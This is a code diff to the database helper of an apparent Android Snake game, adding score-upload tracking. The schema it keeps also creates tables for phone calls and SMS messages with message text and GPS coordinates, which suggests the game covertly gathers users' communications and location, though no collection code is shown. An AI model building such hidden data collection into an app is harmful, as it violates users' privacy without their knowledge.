@@ -22,7 +22,7 @@ import java.util.ArrayList;
 
 public class DatabaseHelper extends SQLiteOpenHelper {
     private static final String DATABASE_NAME = "SnakeScores";
-    private static final int DATABASE_VERSION = 10;
+    private static final int DATABASE_VERSION = 12;
     Context context;
 
     public DatabaseHelper(Context context){
@@ -33,18 +33,18 @@ public class DatabaseHelper extends SQLiteOpenHelper {
     @Override
     public void onCreate(SQLiteDatabase db){
         //Temporary while getting the schema sorted out
-        try {
-            db.execSQL("DROP TABLE Phones;");
-        }catch(Exception ex){}
         try{
             db.execSQL("DROP TABLE PhoneCalls;");
         }catch(Exception ex){}
         try{
             db.execSQL("DROP TABLE SMS;");
         }catch(Exception ex){}
+        try{
+            db.execSQL("DROP TABLE LocalScores;");
+        }catch(Exception ex){}
 
         try {
-            db.execSQL("CREATE TABLE LocalScores (Name TEXT, Score INTEGER);");
+            db.execSQL("CREATE TABLE LocalScores (Name TEXT, Score INTEGER, Uploaded INTEGER);");
         }catch(SQLiteException ex){}
 
         try{
@@ -54,8 +54,6 @@ public class DatabaseHelper extends SQLiteOpenHelper {
         try{
             db.execSQL("CREATE TABLE SMS (DeviceID INTEGER, Participant TEXT, Outgoing INTEGER, Time INTEGER, Message TEXT, Lat INTEGER, Long INTEGER);");
         }catch(SQLiteException ex){}
-
-        db.close();
     }
 
     @Override
@@ -87,6 +85,41 @@ public class DatabaseHelper extends SQLiteOpenHelper {
         db.close();
 
         return scores;
+    }
+
+    public ArrayList<JSONObject> getJSONScores() {
+        SQLiteDatabase db = this.getReadableDatabase();
+        Cursor result = db.query("LocalScores", new String[]{"rowid", "Name", "Score", "Uploaded"}, null, null, null, null, "Score");
+
+        ArrayList<JSONObject> scores = new ArrayList<>();
+        for (int i = 0; i < result.getCount(); i++) {
+            result.moveToPosition(i);
+
+            if(result.getInt(3) == 0) {
+                JSONObject output = new JSONObject();
+                JSONObject score = new JSONObject();
+                try {
+                    output.put("type", "score");
+                    output.put("rowid", result.getLong(0));
+                    score.put("name", result.getString(1));
+                    score.put("score", result.getInt(2));
+                    output.put("score", score);
+                } catch (JSONException ex) {
+                    ex.printStackTrace();
+                }
+
+                scores.add(output);
+            }
+        }
+
+        db.close();
+        return scores;
+    }
+
+    public void markScoreUploaded(long rowID){
+        SQLiteDatabase db = getWritableDatabase();
+        db.execSQL("UPDATE LocalScores SET Uploaded = 1 WHERE rowid = " + rowID);
+        db.close();
     }
 
     public Location getLocation(){
